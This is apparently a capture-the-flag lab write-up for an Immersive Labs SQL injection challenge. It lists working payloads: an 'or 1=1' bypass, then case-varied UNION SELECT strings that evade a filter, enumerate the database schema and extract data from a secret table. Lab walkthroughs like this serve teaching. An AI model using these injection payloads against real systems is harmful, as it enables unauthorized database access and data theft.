---
date: 2025-02-05
categories: [CTF, ImmersiveLabs]
title: "IML - SQLi Basics - Demonstrate your skills"
tags: ['rce', 'sql', 'sqli', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "SQLi Basics - Demonstrate you - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - SQLi Basics - Demonstrate your skills

- username = vulnerable parameter

![image1](../resources/8688020e25a14c42a19c8930ea91d51a.png)

- Cannot use union select because of filters (need to use filter evasion)


![image2](../resources/e82a946f4e574b8bb3453563a3725dd7.png)

- Not breaking with ' or "

- Try using 'or 1=1 -- -


![image3](../resources/869510fc01e94129ab9e28345d7203d4.png)

That worked

- I tried putting too MANY union select statements in, to start with, but the website doesn't break.
(As we found out with trying the ' and ")

- But we know that the search field only displays ONE column output.
So the correct SQLi statement is using:

```bash
'unioN SelecT 1 -- -

```

![image4](../resources/00a91d979e544379b9047796e77ee75b.png)

- Now just replace the **1** with values ie.

```bash
'unioN SelecT database() -- -

```

![image5](../resources/1a7ef064182441c089716f08b1d252a1.png)

```bash
'unioN SelecT version() -- -

```

![image6](../resources/be7a80ac98bd40c384e9c91aaf6d290f.png)

```bash
'unioN SelecT group_concat(table_name) from information_schema.tables where table_schema="user_db" -- -

```

![image7](../resources/41d9fa780c4a48e488086829b2f3a39e.png)

```bash
'unioN SelecT group_concat(column_name) from information_schema.columns where table_name="secret_table" -- -

```

![image8](../resources/18e3539342ad4375a1b85f0da831ba21.png)

```bash
'unioN SelecT group_concat(name,0x2b,value) from secret_table -- -

```
**0x2b is a delimiter(+)**


![image9](../resources/14b91aa84bb64b70ac202606038c4c36.png)
